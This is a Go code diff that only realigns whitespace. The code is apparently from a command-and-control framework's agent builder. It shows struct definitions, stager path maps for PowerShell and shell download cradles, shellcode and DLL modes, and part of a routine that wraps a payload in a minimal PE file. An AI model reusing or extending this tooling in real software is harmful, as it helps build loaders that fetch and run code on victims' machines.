@@ -34,25 +34,25 @@ import (
 // AgentBuilder 通过 Go 交叉编译产出真实 Agent 二进制。
 // AgentBuilder produces real agent binaries via Go cross-compilation.
 type AgentBuilder struct {
-	mu         sync.RWMutex
-	agentSrc   string // path to agent source directory
-	outputDir  string // where to place compiled binaries
-	cache      map[string]*CachedAgent
-	goBin      string // path to go compiler
-	ldflags    string // base ldflags
+	mu        sync.RWMutex
+	agentSrc  string // path to agent source directory
+	outputDir string // where to place compiled binaries
+	cache     map[string]*CachedAgent
+	goBin     string // path to go compiler
+	ldflags   string // base ldflags
 }
 
 // CachedAgent 缓存编译好的 Agent 二进制。
 // CachedAgent holds a compiled agent binary in cache.
 type CachedAgent struct {
-	Data      []byte    `json:"-"`
-	Size      int64     `json:"size"`
-	SHA256    string    `json:"sha256"`
-	Platform  string    `json:"platform"`
-	Arch      string    `json:"arch"`
-	Mode      string    `json:"mode"`
-	BuiltAt   time.Time `json:"built_at"`
-	Config    map[string]string `json:"config"`
+	Data     []byte            `json:"-"`
+	Size     int64             `json:"size"`
+	SHA256   string            `json:"sha256"`
+	Platform string            `json:"platform"`
+	Arch     string            `json:"arch"`
+	Mode     string            `json:"mode"`
+	BuiltAt  time.Time         `json:"built_at"`
+	Config   map[string]string `json:"config"`
 }
 
 // NewAgentBuilder 创建 Agent 构建器。
@@ -284,11 +284,11 @@ func (ab *AgentBuilder) buildStub(info *AgentBuildInfo, config map[string]string
 func (ab *AgentBuilder) generatePowerShellStager(server, key, mode string) []byte {
 	// This generates a functional PowerShell download cradle
 	paths := map[string]string{
-		AgentTypeStage:    "/swt",
+		AgentTypeStage:     "/swt",
 		AgentTypeStageless: "/sww",
 		AgentTypeShellcode: "/sws",
-		AgentTypeDLL:      "/swd",
-		AgentTypeListen:   "/swl",
+		AgentTypeDLL:       "/swd",
+		AgentTypeListen:    "/swl",
 		AgentTypeListenDLL: "/swld",
 	}
 	path, ok := paths[mode]
@@ -329,11 +329,11 @@ try {
 // generateShellStager creates a shell-based staged downloader
 func (ab *AgentBuilder) generateShellStager(server, key, mode string) []byte {
 	paths := map[string]string{
-		AgentTypeStage:    "/swt",
+		AgentTypeStage:     "/swt",
 		AgentTypeStageless: "/swl",
 		AgentTypeShellcode: "/sws",
-		AgentTypeDLL:      "/swd",
-		AgentTypeListen:   "/swl",
+		AgentTypeDLL:       "/swd",
+		AgentTypeListen:    "/swl",
 	}
 	path, ok := paths[mode]
 	if !ok {
@@ -553,8 +553,8 @@ func MinimalPE(payload []byte) []byte {
 	textSection := make([]byte, 40)
 	copy(textSection[0:8], []byte(".text\x00\x00\x00"))
 	virtualSize := alignUp(uint32(len(payload)), sectionAlignment)
-	binary.LittleEndian.PutUint32(textSection[8:12], virtualSize)    // VirtualSize
-	binary.LittleEndian.PutUint32(textSection[12:16], 0x1000)        // VirtualAddress (RVA)
+	binary.LittleEndian.PutUint32(textSection[8:12], virtualSize) // VirtualSize
+	binary.LittleEndian.PutUint32(textSection[12:16], 0x1000)     // VirtualAddress (RVA)
 	rawSize := alignUp(uint32(len(payload)), fileAlignment)
 	binary.LittleEndian.PutUint32(textSection[16:20], rawSize)       // SizeOfRawData
 	binary.LittleEndian.PutUint32(textSection[20:24], sizeOfHeaders) // PointerToRawData
